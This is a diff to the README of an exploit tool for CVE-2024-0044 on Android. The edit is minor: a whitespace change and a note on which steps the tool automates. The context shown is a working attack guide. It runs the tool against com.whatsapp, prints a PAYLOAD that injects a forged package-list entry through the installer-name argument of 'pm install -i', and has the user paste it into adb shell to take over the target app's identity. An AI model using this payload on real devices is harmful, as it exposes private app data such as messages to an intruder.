@@ -49,7 +49,7 @@ options:
 
 ``-A`` to specify the apk file to push in the device
 ## Exploitation
-Run the tool
+Run the tool 
 ```python3 cve_2024_0044.py -P com.whatsapp -A /home/pl4int3xt/Downloads/F-Droid.apk```
 
 A ```payload.txt``` file like this will be generated
@@ -58,6 +58,8 @@ PAYLOAD="@null
 victim 10289 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
 pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk
 ```
+#### The tool automates some parts and other parts are manual. You can exit after generating the payload and run all the commands manually or you can continue with the instructions 
+
 ### Next you'll need to connect to your device using adb shell and paste in the payload and make sure you get a ``Success`` message back after the last command
 ```
 pl4int3xt ~>  adb shell
